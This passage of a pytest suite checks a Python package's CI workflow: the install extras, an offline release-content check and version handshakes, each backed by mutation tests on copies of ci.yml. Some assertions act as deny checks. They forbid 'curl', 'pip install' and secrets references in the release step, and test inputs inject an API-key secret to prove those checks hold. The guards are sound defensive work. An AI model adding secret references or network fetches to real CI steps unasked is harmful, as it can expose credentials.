        tmp_path, strip_expected_version, "the push-lane battery must run on the editable"
    )


def test_hardcoded_version_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: a pinned literal instead of the derivation must FAIL."""
    declared = release_version.pyproject_version(REPO / "pyproject.toml")

    def hardcode(step: dict) -> None:
        assert '--expected-version "${VERSION}"' in step["run"], (
            "premise broken: the invocation changed shape"
        )
        step["run"] = step["run"].replace(
            '--expected-version "${VERSION}"', f'--expected-version "{declared}"'
        )
        assert declared in step["run"]

    _assert_mutated_copy_fails(tmp_path, hardcode, "must run on the editable")


def test_literal_version_alongside_the_derivation_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: deriving the version AND pinning a literal is still a hardcode.

    This mutation leaves every other assertion satisfied (same command, same
    tomllib derivation) and plants a STALE literal — the shape a copy-paste from
    a previous release leaves behind — so it isolates the no-literal-version
    check from the "this repo's version" one.
    """
    stale_literal = "0.2.5"

    def add_literal(step: dict) -> None:
        assert 'echo "expected version from pyproject.toml: ${VERSION}"' in step["run"], (
            "premise broken: the echo line changed shape"
        )
        step["run"] = step["run"].replace(
            'echo "expected version from pyproject.toml: ${VERSION}"',
            f'echo "expected version from pyproject.toml: ${{VERSION}} (pinned {stale_literal})"',
        )
        assert stale_literal in step["run"]

    _assert_mutated_copy_fails(tmp_path, add_literal, "no literal version string")


def test_bare_python_interpreter_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: the matrix `python` is not the .venv the battery asserts against."""

    def use_bare_python(step: dict) -> None:
        assert "VERSION=$(.venv/bin/python -c " in step["run"], (
            "premise broken: the derivation changed shape"
        )
        step["run"] = step["run"].replace("VERSION=$(.venv/bin/python -c ", "VERSION=$(python -c ")
        assert "VERSION=$(python -c " in step["run"]

    _assert_mutated_copy_fails(tmp_path, use_bare_python, "invoke the repo's own .venv interpreter")


def test_secret_reference_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: the battery needs no keys, so a secrets.* env must FAIL the pin."""

    def add_secret(step: dict) -> None:
        step["env"] = {"DEEPSEEK_API_KEY": "${{ secrets.DEEPSEEK_API_KEY }}"}
        assert step["env"]

    _assert_mutated_copy_fails(tmp_path, add_secret, "the battery is keyless")


# --- the unit lane's install reaches the LSP tooling (INT-GATE-003) ---------- #
#
# CI runs 35355829236 / 35355973875 failed every Python version of the `test`
# job with:
#
#     tests/test_lsp_lint_plugins.py::test_pyflakes_reports_an_undefined_name
#     - ModuleNotFoundError: No module named 'pylsp'
#
# The job installed only `.[full]`, and `python-lsp-server[pycodestyle,pyflakes]`
# is declared in the dev extra alone — the same extra the documented contributor
# install uses, because the guard's `lsp` lane resolves `pylsp` from PATH
# (tests/test_guard_docs.py owns that half). A unit lane that runs an LSP
# regression test therefore has to install the extra that provides the tool. The
# workflow line is the fix; these tests are what keep it from drifting back to
# `.[full]`.

#: The repo-editable install in a job's run block, capturing its extras list —
#: ``.venv/bin/pip install -e ".[dev,full]"`` -> ``dev,full``.
EDITABLE_INSTALL_RE = re.compile(r'\.venv/bin/pip install -e "\.\[([^"\]]*)\]"')

#: Extras the `test` job must request: `dev` provides the LSP tooling its unit
#: lane exercises, `full` the runtime/web pins the suite imports.
TEST_JOB_EXTRAS = {"dev", "full"}

#: The LSP server the dev extra declares, and the lint backends it gates behind
#: its own extras. tests/test_lsp_lint_plugins.py owns that declaration contract;
#: reading it here is what makes "the job installs dev" mean the lane can work.
LSP_SERVER = "python-lsp-server"
LSP_LINT_BACKENDS = ("pycodestyle", "pyflakes")

#: The unit lane's LSP regression test — the reason the extras are installed.
LSP_TESTS_PATH = REPO / "tests" / "test_lsp_lint_plugins.py"


def _editable_installs(job: dict) -> list[tuple[int, dict, set[str]]]:
    """``(step index, step, extras)`` for every repo-editable install in a job."""
    installs: list[tuple[int, dict, set[str]]] = []
    for index, step in enumerate(job["steps"]):
        for extras in EDITABLE_INSTALL_RE.findall(step.get("run", "")):
            names = {name.strip() for name in extras.split(",") if name.strip()}
            installs.append((index, step, names))
    return installs


def _dev_extra_lsp_requirement() -> Requirement:
    """The dev extra's requirement for the LSP server the guard's lane runs."""
    data = tomllib.loads((REPO / "pyproject.toml").read_text(encoding="utf-8"))
    dev = list(data["project"]["optional-dependencies"]["dev"])
    matches = [Requirement(spec) for spec in dev if Requirement(spec).name == LSP_SERVER]
    assert len(matches) == 1, f"expected exactly one {LSP_SERVER} dev requirement, got {matches}"
    return matches[0]


def _assert_test_job_installs_the_dev_extras(job: dict) -> dict:
    """Assert the `test` job installs the extras its unit lane needs; return the step.

    The whole contract lives in this one helper so the mutation tests below judge
    a mutated COPY by exactly the assertions the real workflow passes.
    """
    installs = _editable_installs(job)
    assert len(installs) == 1, (
        "the `test` job must declare exactly one editable install of this package, got "
        f"{[(index, sorted(extras)) for index, _, extras in installs]} — the unit lane's "
        "dependencies come from `.[dev,full]`, never from a bare `pip install -e .`"
    )
    index, step, extras = installs[0]

    assert extras == TEST_JOB_EXTRAS, (
        f"the `test` job installs extras {sorted(extras)} instead of {sorted(TEST_JOB_EXTRAS)} "
        f"(missing {sorted(TEST_JOB_EXTRAS - extras)}, unexpected {sorted(extras - TEST_JOB_EXTRAS)}). "
        "The job runs tests/test_lsp_lint_plugins.py, which drives pylsp's pycodestyle and "
        "pyflakes backends — those live behind the dev extra, so `.[full]` alone fails every "
        "matrix version with ModuleNotFoundError: No module named 'pylsp' (CI 35355829236). "
        f"Install `.[{','.join(sorted(TEST_JOB_EXTRAS))}]`."
    )

    missing_backends = sorted(set(LSP_LINT_BACKENDS) - set(_dev_extra_lsp_requirement().extras))
    assert not missing_backends, (
        f"the dev extra declares {LSP_SERVER} without {missing_backends}, so installing the dev "
        "extra in CI would still leave the LSP lane — and the unit test that exercises it — "
        "without a working lint backend"
    )

    steps = job["steps"]
    unit_index = next((i for i, s in enumerate(steps) if "-m pytest tests/" in s.get("run", "")), None)
    assert unit_index is not None, "premise broken: the `test` job declares no unit-test step"
    assert index < unit_index, (
        f"the editable install (step {index}) must precede the unit tests (step {unit_index}) — "
        "installing the extras afterwards provisions a lane that has already run"
    )
    return step


def test_test_job_installs_the_extras_its_unit_lane_imports(workflow: dict) -> None:
    """INT-GATE-003: the unit job installs `.[dev,full]`, so pylsp is present."""
    step = _assert_test_job_installs_the_dev_extras(workflow["jobs"]["test"])
    assert ".[dev,full]" in step["run"], step["run"]


def test_the_lsp_regression_test_still_imports_pylsp() -> None:
    """Premise guard: the install pin is only meaningful while that reason holds.

    Without this the pin could stay green after the LSP regression test was
    renamed or deleted, and the next `.[full]` regression would look harmless.
    """
    assert LSP_TESTS_PATH.exists(), (
        f"{LSP_TESTS_PATH.name} is gone — the `test` job's extra install guards nothing. "
        "Re-derive which extras the unit lane needs before keeping this pin."
    )
    source = LSP_TESTS_PATH.read_text(encoding="utf-8")
    assert "from pylsp import lsp" in source, (
        "the LSP regression test no longer imports pylsp at test level, which was the shape "
        "that failed CI 35355829236; re-check the unit lane's real dependency set"
    )


def _assert_mutated_test_job_install_fails(
    tmp_path: Path, mutate: Callable[[dict], None], match: str
) -> None:
    """A mutated COPY of ci.yml must FAIL the install contract (real file untouched)."""
    doc = _load_workflow()
    mutate(doc["jobs"]["test"])
    mutated = _load_workflow(_write_workflow_copy(tmp_path, doc))
    with pytest.raises(AssertionError, match=re.escape(match)):
        _assert_test_job_installs_the_dev_extras(mutated["jobs"]["test"])


def test_dropping_the_dev_extra_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: the exact CI regression — `.[full]` alone — must FAIL the pin."""

    def drop_dev(job: dict) -> None:
        installs = _editable_installs(job)
        assert len(installs) == 1, f"premise broken: expected one install, got {installs}"
        assert installs[0][2] == TEST_JOB_EXTRAS, "premise broken: the install line changed shape"
        step = installs[0][1]
        step["run"] = step["run"].replace('".[dev,full]"', '".[full]"')
        assert _editable_installs(job)[0][2] == {"full"}, "premise broken: the mutation did not land"

    _assert_mutated_test_job_install_fails(tmp_path, drop_dev, "missing ['dev']")


def test_bare_editable_install_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: `pip install -e .` requests no extras at all — no pylsp, no pins."""

    def strip_extras(job: dict) -> None:
        installs = _editable_installs(job)
        assert len(installs) == 1, f"premise broken: expected one install, got {installs}"
        step = installs[0][1]
        assert ".[dev,full]" in step["run"], "premise broken: the install line changed shape"
        step["run"] = step["run"].replace('".[dev,full]"', ".")
        assert not _editable_installs(job), "premise broken: the install still matches"

    _assert_mutated_test_job_install_fails(tmp_path, strip_extras, "exactly one editable install")


def test_install_after_the_unit_tests_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: installing the extras after the unit tests provisions nothing."""

    def move_after_tests(job: dict) -> None:
        installs = _editable_installs(job)
        assert len(installs) == 1, f"premise broken: expected one install, got {installs}"
        install_index, step, _ = installs[0]
        steps = job["steps"]

        def unit_index() -> int:
            return next(i for i, s in enumerate(steps) if "-m pytest tests/" in s.get("run", ""))

        assert install_index < unit_index(), "premise broken: the install already ran after the tests"
        steps.remove(step)
        target = unit_index()
        steps.insert(target + 1, step)
        assert _editable_installs(job)[0][0] == target + 1, "premise broken: step not moved"

    _assert_mutated_test_job_install_fails(tmp_path, move_after_tests, "must precede the unit tests")


# --- release content: the published artifact carries the first-run fixes ------ #
#
# DF-CHIMERA-V2-9 (d44599e): the `chimera-mcp` initialize handshake must
# advertise CHIMERA's package version; pre-fix it advertised the mcp SDK's own
# version (1.28.1) for a 0.2.6 build, so a client could not tell which chimera
# build it had reached.
# DF-CHIMERA-V2-8 (82fc656): the installed missing-config error must name
# `chimera config init`; pre-fix it only pointed at copying chimera.yaml.example
# out of the cwd — impossible for a bare pip install, whose template lives
# inside the wheel.
#
# Both are behaviours of the INSTALLED artifact, and both fixes landed after the
# tag that shipped without them, so scripts/release_content_check.py EXECUTES the
# pinned venv (a real stdio initialize request, plus the installed config module
# in a fresh empty temp cwd) instead of judging the checkout. The stale shapes
# are replayed offline here through a stand-in venv.

#: The release-content step contract, pinned exactly: the runner's `python`, the
#: standalone script, the pinned release venv, and the tag-derived version
#: (never a literal, never read back from the artifact under test).
RELEASE_CONTENT_COMMAND = [
    "python",
    "scripts/release_content_check.py",
    "--venv",
    "/tmp/release-venv",
    "--expected-version",
    "${VERSION}",
]


def _release_content_steps(job: dict) -> list[dict]:
    """The job's steps that invoke the release-content check."""
    return [step for step in job["steps"] if "release_content_check.py" in step.get("run", "")]


def _assert_release_verify_runs_release_content_check(job: dict) -> dict:
    """Assert the release-content contract, and return the step it pinned.

    The whole contract lives in this one helper so the mutation tests below
    judge a mutated COPY by exactly the assertions the real workflow passes.
    """
    steps = job["steps"]
    content_steps = _release_content_steps(job)
    assert len(content_steps) == 1, (
        f"release-verify must declare exactly one release-content step, found {len(content_steps)}"
    )
    step = content_steps[0]
    run = step["run"]

    invocations = [
        line.strip()
        for line in run.splitlines()
        if "release_content_check.py" in line and not line.strip().startswith("#")
    ]
    assert len(invocations) == 1, f"expected exactly one invocation, got {invocations}"
    command = shlex.split(invocations[0])
    assert command == RELEASE_CONTENT_COMMAND, (
        "the release-content check must run on the pinned /tmp/release-venv (the exact "
        f"published artifact) with the tag-derived version, got {command}"
    )

    assert not step.get("env"), (
        f"the release-content check is offline and keyless, got env={step.get('env')}"
    )
    assert "secrets." not in yaml.safe_dump(step), f"the check is keyless, got {step}"
    assert "curl" not in run and "pip install" not in run, run

    content_index = steps.index(step)
    install_index = next(
        i
        for i, s in enumerate(steps)
        if "chimera-deliberation[full]==${VERSION}" in s.get("run", "")
    )
    live_indices = [
        i
        for i, s in enumerate(steps)
        if "GATE-OK" in s.get("run", "") or "probe_mcp_stdio" in s.get("run", "")
    ]
    assert live_indices, "premise broken: release-verify declares no live gate"
    first_live_index = min(live_indices)
    assert install_index < content_index < first_live_index, (
        "the release-content check must run AFTER the pinned install and BEFORE the expensive "
        f"live gates (install={install_index}, content={content_index}, "
        f"first live gate={first_live_index})"
    )
    return step


def test_release_content_check_wired_into_release_verify(workflow: dict) -> None:
    """The two first-run fixes are asserted against the published artifact."""
    step = _assert_release_verify_runs_release_content_check(workflow["jobs"]["release-verify"])
    assert "PUBLISHED" in step["name"], step["name"]
    assert "DF-CHIMERA-V2-9" in step["name"] and "DF-CHIMERA-V2-8" in step["name"], step["name"]


#: The venv interpreter an editable install is exercised through.
REPO_VENV_PYTHON = REPO / ".venv" / "bin" / "python"


def _path_probeable(path: Path) -> bool:
    """True when ``path`` exists, treating an unreadable component as absent.

    ``Path.exists()`` RAISES PermissionError (OSError) instead of returning
    False when a path component is not traversable — e.g. a synced .venv whose
    ``bin/python`` is an absolute symlink into a 0700 home. Evaluated at
    module import, that interrupts collection for the WHOLE session, so the
    guard below must skip, never crash (QA-CHIMERA-V2-18).
    """
    try:
        return path.exists()
    except OSError:
        return False


requires_repo_venv = pytest.mark.skipif(
    not _path_probeable(REPO_VENV_PYTHON),
    reason="the repo .venv (editable install) is required (absent or unreadable)",
)


def test_repo_venv_guard_treats_unreadable_venv_as_absent(tmp_path: Path) -> None:
    """An unreadable .venv must SKIP the venv-gated tests, never crash collection.

    Regression for QA-CHIMERA-V2-18: the module-level skipif used to probe
    with bare ``Path.exists()``, which raises PermissionError for a path with
    an untraversable component (here: a ``bin`` directory with mode 000 — the
    hermetic stand-in for a synced .venv whose binary lives under a 0700
    home). The probe must treat unreadable as absent.
    """
    readable = tmp_path / "readable"
    readable.write_bytes(b"")
    assert _path_probeable(readable) is True
    assert _path_probeable(tmp_path / "missing") is False

    bin_dir = tmp_path / ".venv" / "bin"
    bin_dir.mkdir(parents=True)
    (bin_dir / "python").write_bytes(b"")
    bin_dir.chmod(0o000)
    try:
        assert _path_probeable(bin_dir / "python") is False
    finally:
        bin_dir.chmod(0o755)  # restore BEFORE pytest removes tmp_path


def _repo_version() -> str:
    """The version pyproject.toml declares — the editably-installed version."""
    return release_version.pyproject_version(REPO / "pyproject.toml")


# --- offline stand-ins for an installed release venv -------------------------- #

#: Stand-in for the installed `chimera-mcp` console script: reads one request
#: line (as the real stdio server does) and answers it.
_FAKE_MCP_TEMPLATE = '''#!__INTERPRETER__
"""Offline stand-in for the installed chimera-mcp console script (test fixture)."""
import json
import sys

sys.stdin.readline()
print(json.dumps({"jsonrpc": "2.0", "id": 1, "result": __RESULT__}))
'''

#: Stand-in for an entry point that never answers (exits non-zero, no JSON-RPC).
_FAKE_SILENT_MCP_TEMPLATE = '''#!__INTERPRETER__
"""Offline stand-in for a chimera-mcp that never answers (test fixture)."""
import sys

sys.stdin.readline()
print("not a JSON-RPC response")
raise SystemExit(7)
'''

#: Stand-in for the venv interpreter: answers the documented remedy probe and
#: refuses anything else, so the fixture exercises the real invocation contract.
_FAKE_PYTHON_TEMPLATE = '''#!__INTERPRETER__
"""Offline stand-in for the installed venv interpreter (test fixture)."""
import json
import sys

code = " ".join(sys.argv[1:])
if "release-content-remedy" not in code:
    print("unexpected probe: %r" % (sys.argv[1:],), file=sys.stderr)
    raise SystemExit(9)
print(json.dumps({"remedy": __REMEDY__}))
'''

CURRENT_INIT_RESULT = {
    "protocolVersion": "2025-03-26",
    "capabilities": {},
    "serverInfo": {"name": "chimera", "version": "0.2.6"},
}
#: What the pre-0.2.6 server reported: the mcp SDK's own version.
SDK_VERSION_INIT_RESULT = {
    "protocolVersion": "2025-03-26",
    "capabilities": {},
    "serverInfo": {"name": "chimera", "version": "1.28.1"},
}
NO_VERSION_INIT_RESULT = {
    "protocolVersion": "2025-03-26",
    "capabilities": {},
    "serverInfo": {"name": "chimera"},
}

#: The remedy a bare pip install cannot follow (pre-82fc656), and the one it can.
OLD_REMEDY = "No chimera.yaml found. Copy chimera.yaml.example to chimera.yaml."
CURRENT_REMEDY = (
    "No chimera.yaml found. Copy chimera.yaml.example to chimera.yaml. "
    "Run `chimera config init` to create one from the shipped template "
    "(the wheel carries it, so this also works for pip installs)."
)


def _make_fake_release_venv(
    tmp_path: Path,
    *,
    dist_version: str = "0.2.6",
    sdk_version: str | None = "1.28.1",
    init_result: dict | None = None,
    remedy: str | None = CURRENT_REMEDY,
    silent_mcp: bool = False,
) -> Path:
    """A release-venv-shaped directory whose entry points are offline stand-ins."""
    venv = tmp_path / "fake-release-venv"
    site = venv / "lib" / "python3.11" / "site-packages"
    site.mkdir(parents=True, exist_ok=True)
    (site / f"chimera_deliberation-{dist_version}.dist-info").mkdir()
    if sdk_version is not None:
        (site / f"mcp-{sdk_version}.dist-info").mkdir()

    bindir = venv / "bin"
    bindir.mkdir(parents=True, exist_ok=True)
    if silent_mcp:
        mcp_body = _FAKE_SILENT_MCP_TEMPLATE
    else:
        mcp_body = _FAKE_MCP_TEMPLATE.replace(
            "__RESULT__", repr(init_result if init_result is not None else CURRENT_INIT_RESULT)
        )
    python_body = _FAKE_PYTHON_TEMPLATE.replace("__REMEDY__", repr(remedy))
    for name, body in (("chimera-mcp", mcp_body), ("python", python_body)):
        entry = bindir / name
        entry.write_text(body.replace("__INTERPRETER__", sys.executable), encoding="utf-8")
        entry.chmod(0o755)
    return venv


def _run_release_content(*args: str, cwd: Path | None = None) -> subprocess.CompletedProcess:
    """Run the check as a real process — its exit codes ARE the contract."""
    return subprocess.run(
        [sys.executable, str(RELEASE_CONTENT_PATH), *args],
        capture_output=True,
        text=True,
        cwd=str(cwd or REPO),
        timeout=120,
    )


def test_release_content_accepts_a_current_package(tmp_path: Path) -> None:
    """GREEN control: a wheel with both first-run fixes passes, 3/3 checks."""
    venv = _make_fake_release_venv(tmp_path)
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 0, f"{proc.stdout}\n{proc.stderr}"
    assert "CHECKS_PASSED=3 CHECKS_FAILED=0" in proc.stdout
    assert "RELEASE CONTENT OK" in proc.stdout
    assert "HANDSHAKE_VERSION=0.2.6" in proc.stdout


def test_release_content_rejects_the_mcp_sdk_version_in_the_handshake(tmp_path: Path) -> None:
    """RED shape of the pre-d44599e wheel: the handshake reports the mcp SDK version.

    The 0.2.6-tagged build advertised 1.28.1 (the mcp distribution's own
    version) while `chimera --version` said 0.2.6. The check must fail, name the
    SDK-version defect, and leave the two unrelated checks passing.
    """
    venv = _make_fake_release_venv(tmp_path, init_result=SDK_VERSION_INIT_RESULT)
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 1, f"{proc.stdout}\n{proc.stderr}"
    assert "[FAIL] mcp-handshake-version" in proc.stdout, proc.stdout
    assert "advertises the mcp SDK version 1.28.1" in proc.stdout, proc.stdout
    assert "instead of the package version 0.2.6" in proc.stdout, proc.stdout
    assert "DF-CHIMERA-V2-9" in proc.stdout, proc.stdout
    assert "HANDSHAKE_VERSION=1.28.1" in proc.stdout, proc.stdout
    # Localised: the fix's own check fails, nothing else does.
    assert "[PASS] installed-dist-version" in proc.stdout
    assert "[PASS] missing-config-remedy" in proc.stdout
    assert "RELEASE CONTENT FAIL" in proc.stdout


def test_release_content_rejects_a_handshake_without_a_version(tmp_path: Path) -> None:
    """A handshake carrying no version must never be read as a match."""
    venv = _make_fake_release_venv(tmp_path, init_result=NO_VERSION_INIT_RESULT)
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 1, f"{proc.stdout}\n{proc.stderr}"
    assert "[FAIL] mcp-handshake-version" in proc.stdout, proc.stdout
    assert "carried no serverInfo.version" in proc.stdout, proc.stdout
    assert "HANDSHAKE_VERSION=(missing)" in proc.stdout, proc.stdout


def test_release_content_rejects_a_silent_mcp_entry_point(tmp_path: Path) -> None:
    """An entry point that never answers is a failure, promptly and named."""
    venv = _make_fake_release_venv(tmp_path, silent_mcp=True)
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 1, f"{proc.stdout}\n{proc.stderr}"
    assert "[FAIL] mcp-handshake-version" in proc.stdout, proc.stdout
    assert "no JSON-RPC initialize response" in proc.stdout, proc.stdout
    assert "HANDSHAKE_VERSION=(no response)" in proc.stdout, proc.stdout


def test_release_content_rejects_the_old_copy_only_remedy(tmp_path: Path) -> None:
    """RED shape of the pre-82fc656 wheel: the remedy is a copy from the cwd.

    A bare pip install has no chimera.yaml.example in its cwd, so that remedy
    cannot be followed; the check must fail and name `chimera config init`.
    """
    venv = _make_fake_release_venv(tmp_path, remedy=OLD_REMEDY)
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 1, f"{proc.stdout}\n{proc.stderr}"
    assert "[FAIL] missing-config-remedy" in proc.stdout, proc.stdout
    assert "does not name `chimera config init`" in proc.stdout, proc.stdout
    assert "DF-CHIMERA-V2-8" in proc.stdout, proc.stdout
    # Localised: the MCP check the same wheel gets right still passes.
    assert "[PASS] mcp-handshake-version" in proc.stdout
    assert "[PASS] installed-dist-version" in proc.stdout


def test_release_content_rejects_a_venv_that_is_not_the_pinned_version(tmp_path: Path) -> None:
    """A venv holding another version cannot judge this release."""
    venv = _make_fake_release_venv(tmp_path, dist_version="0.2.5")
    proc = _run_release_content("--venv", str(venv), "--expected-version", "0.2.6")
    assert proc.returncode == 1, f"{proc.stdout}\n{proc.stderr}"
    assert "[FAIL] installed-dist-version" in proc.stdout, proc.stdout
    assert "metadata says 0.2.5, expected 0.2.6" in proc.stdout, proc.stdout


@requires_repo_venv
def test_release_content_accepts_the_repo_editable_install() -> None:
    """GREEN control against the REAL package: both fixes are present at HEAD.

    The same prologue the release gate runs, minus the venv: this is the
    behaviour the check exists to protect, executed end-to-end (a real
    initialize handshake, a real `find_config_path` message).
    """
    version = _repo_version()
    proc = _run_release_content("--venv", str(REPO / ".venv"), "--expected-version", version)
    assert proc.returncode == 0, f"{proc.stdout}\n{proc.stderr}"
    assert "CHECKS_PASSED=3 CHECKS_FAILED=0" in proc.stdout, proc.stdout
    assert f"HANDSHAKE_VERSION={version}" in proc.stdout, proc.stdout
    assert "RELEASE CONTENT OK" in proc.stdout


@requires_repo_venv
def test_release_content_probes_in_a_temp_cwd_not_the_callers(tmp_path: Path) -> None:
    """A chimera.yaml in the CALLER's cwd must not mask the missing-config probe.

    The check must execute the installed package from a fresh empty temp cwd
    (the fresh-user shape); if it inherited the caller's directory, the probe
    would find this chimera.yaml and the remedy could never be judged.
    """
    (tmp_path / "chimera.yaml").write_text("server: {}\n", encoding="utf-8")
    proc = _run_release_content(
        "--venv", str(REPO / ".venv"), "--expected-version", _repo_version(), cwd=tmp_path
    )
    assert proc.returncode == 0, f"{proc.stdout}\n{proc.stderr}"
    assert "missing-config error names `chimera config init`" in proc.stdout, proc.stdout


@pytest.mark.parametrize(
    "args",
    [
        (),  # --expected-version is required
        ("--venv", "/tmp"),  # venv given, version missing
        ("--expected-version", ""),  # blank value
        ("--expected-version", "0.2.6", "--bogus"),  # unknown option
        ("--expected-version", "0.2.6", "--venv"),  # missing option value
        ("--expected-version", "0.2.6", "--venv", "/nonexistent-venv-v29"),  # not a dir
        ("--expected-version", "0.2.6", "positional"),  # unexpected positional
    ],
)
def test_release_content_usage_errors_exit_2(args: tuple[str, ...]) -> None:
    """Documented exit contract: bad input is 2 — never 1 and never a traceback."""
    proc = _run_release_content(*args)
    assert proc.returncode == 2, (
        f"expected usage exit 2 for {args}, got {proc.returncode}\n{proc.stdout}\n{proc.stderr}"
    )
    assert "usage error" in proc.stderr, proc.stderr
    assert "Traceback" not in proc.stderr, proc.stderr


def test_release_content_installed_dist_version_reads_the_venv_metadata(tmp_path: Path) -> None:
    """The version comes from the venv's own dist-info, and only from there."""
    site = tmp_path / "lib" / "python3.12" / "site-packages"
    site.mkdir(parents=True)
    (site / "chimera_deliberation-9.9.9.dist-info").mkdir()
    (site / "mcp-1.28.1.dist-info").mkdir()
    assert release_content.installed_dist_version(tmp_path, "chimera-deliberation") == "9.9.9"
    assert release_content.installed_dist_version(tmp_path, "chimera_deliberation") == "9.9.9"
    assert release_content.installed_dist_version(tmp_path, "mcp") == "1.28.1"
    assert release_content.installed_dist_version(tmp_path, "not-installed") is None


def test_release_content_server_info_version_rejects_empty_shapes() -> None:
    """Only a non-blank string version counts — never a missing/odd shape."""
    assert release_content.server_info_version({"serverInfo": {"version": "0.2.6"}}) == "0.2.6"
    assert release_content.server_info_version({"serverInfo": {"version": " 0.2.6 "}}) == "0.2.6"
    for shape in (
        None,
        {},
        {"serverInfo": None},
        {"serverInfo": {}},
        {"serverInfo": {"version": ""}},
        {"serverInfo": {"version": "   "}},
        {"serverInfo": {"version": 3}},
        {"serverInfo": "chimera"},
    ):
        assert release_content.server_info_version(shape) is None, shape


def test_release_content_handshake_problem_names_the_sdk_version_shape() -> None:
    """A match is silent; the SDK-version shape is named; nothing is guessed."""
    assert release_content.handshake_version_problem("0.2.6", "0.2.6", "1.28.1") is None

    sdk = release_content.handshake_version_problem("0.2.6", "1.28.1", "1.28.1")
    assert sdk is not None
    assert "mcp SDK version 1.28.1" in sdk
    assert "package version 0.2.6" in sdk
    assert "DF-CHIMERA-V2-9" in sdk

    missing = release_content.handshake_version_problem("0.2.6", None, "1.28.1")
    assert missing is not None and "no serverInfo.version" in missing

    other = release_content.handshake_version_problem("0.2.6", "0.2.5", "1.28.1")
    assert other is not None
    assert "advertises 0.2.5 instead of the package version 0.2.6" in other
    assert "mcp SDK version" not in other


def test_release_content_remedy_problem_accepts_only_a_runnable_remedy() -> None:
    """The current message passes; the copy-only message and silence fail."""
    assert release_content.remedy_problem(CURRENT_REMEDY) is None

    stale = release_content.remedy_problem(OLD_REMEDY)
    assert stale is not None
    assert "`chimera config init`" in stale
    assert "DF-CHIMERA-V2-8" in stale

    absent = release_content.remedy_problem(None)
    assert absent is not None and "no error message" in absent


def test_release_content_reports_a_silent_child_without_hanging(tmp_path: Path) -> None:
    """The driver bounds a child that never answers instead of blocking forever."""
    timeout = 1
    outcome = release_content.drive_initialize(
        [sys.executable, "-c", "import time; time.sleep(30)"],
        release_content.child_env(),
        str(tmp_path),
        timeout,
    )
    assert outcome.responded is False
    assert outcome.version is None
    assert outcome.problem is not None
    assert f"no JSON-RPC initialize response within {timeout}s" in outcome.problem


# --- the pin cannot be removed, weakened, or pointed at the checkout ---------- #


def _assert_mutated_release_verify_fails(
    tmp_path: Path, mutate: Callable[[dict], None], match: str
) -> None:
    """A mutated COPY of ci.yml must FAIL the contract (the real file is untouched)."""
    doc = _load_workflow()
    mutate(doc["jobs"]["release-verify"])
    mutated = _load_workflow(_write_workflow_copy(tmp_path, doc))
    with pytest.raises(AssertionError, match=re.escape(match)):
        _assert_release_verify_runs_release_content_check(mutated["jobs"]["release-verify"])


def test_release_content_step_removed_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: drop the step -> the assertions must FAIL."""

    def remove_step(job: dict) -> None:
        before = len(_release_content_steps(job))
        job["steps"] = [
            s for s in job["steps"] if "release_content_check.py" not in s.get("run", "")
        ]
        after = len(_release_content_steps(job))
        assert (before, after) == (1, 0), f"premise broken: {before} -> {after}"

    _assert_mutated_release_verify_fails(tmp_path, remove_step, "exactly one release-content step")


def test_pointing_the_release_content_check_at_the_checkout_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: judging the checkout `.venv` instead of the artifact must FAIL.

    This is the whole defect class the check exists for: a gate that inspects
    the source tree stays green while the published wheel lacks the fix.
    """

    def use_repo_venv(job: dict) -> None:
        step = _release_content_steps(job)[0]
        assert "--venv /tmp/release-venv" in step["run"], "premise broken: invocation changed shape"
        step["run"] = step["run"].replace("--venv /tmp/release-venv", "--venv .venv")
        assert "--venv .venv" in step["run"]

    _assert_mutated_release_verify_fails(
        tmp_path, use_repo_venv, "must run on the pinned /tmp/release-venv"
    )


def test_expected_version_removed_fails_the_release_content_pin(tmp_path: Path) -> None:
    """NEGATIVE: without --expected-version the check only compares the artifact
    against itself, so the pin must FAIL."""

    def strip_expected_version(job: dict) -> None:
        step = _release_content_steps(job)[0]
        assert '--expected-version "${VERSION}"' in step["run"], "premise broken: shape changed"
        step["run"] = step["run"].replace('--expected-version "${VERSION}"', "")
        assert "--expected-version" not in step["run"]

    _assert_mutated_release_verify_fails(
        tmp_path, strip_expected_version, "must run on the pinned /tmp/release-venv"
    )


def test_release_content_step_secret_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: the check is offline; a secrets.* env must FAIL the pin."""

    def add_secret(job: dict) -> None:
        step = _release_content_steps(job)[0]
        step["env"] = {"DEEPSEEK_API_KEY": "${{ secrets.DEEPSEEK_API_KEY }}"}
        assert step["env"]

    _assert_mutated_release_verify_fails(
        tmp_path, add_secret, "the release-content check is offline and keyless"
    )


def test_release_content_check_after_the_live_gates_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: it must run BEFORE the expensive live gates, not after."""

    def move_to_the_end(job: dict) -> None:
        step = _release_content_steps(job)[0]
        job["steps"].remove(step)
        job["steps"].append(step)
        assert _release_content_steps(job) == [step], "premise broken: step lost"

    _assert_mutated_release_verify_fails(
        tmp_path, move_to_the_end, "AFTER the pinned install and BEFORE the expensive"
    )


